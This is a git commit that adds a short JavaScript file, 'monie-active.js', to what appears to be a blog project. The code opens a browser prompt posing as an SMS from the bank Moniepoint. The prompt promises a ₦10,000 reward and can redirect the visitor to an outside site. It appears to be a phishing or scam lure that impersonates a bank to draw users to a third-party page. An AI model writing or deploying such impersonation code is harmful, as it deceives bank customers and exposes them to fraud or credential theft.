e468170fe680f078b8319f21ca419c19d004f8cc
dhatablog <williamsnsiako@gmail.com>
2025-10-15 13:40:44 +0100

    Create monie-active.js

---
+++ monie-active.js
@@ -0,0 +1,5 @@
+var password = '₦10,000 REWARD'
+password=prompt('SMS: Congratulations, your moniepoint acc. number is eligible to receive ₦10,000, click OK to withdraw','₦10,000 REWARD');
+if (password != '₦10,000 REWARD') {
+location.href='https://eahigh.org/monie.html';
+}
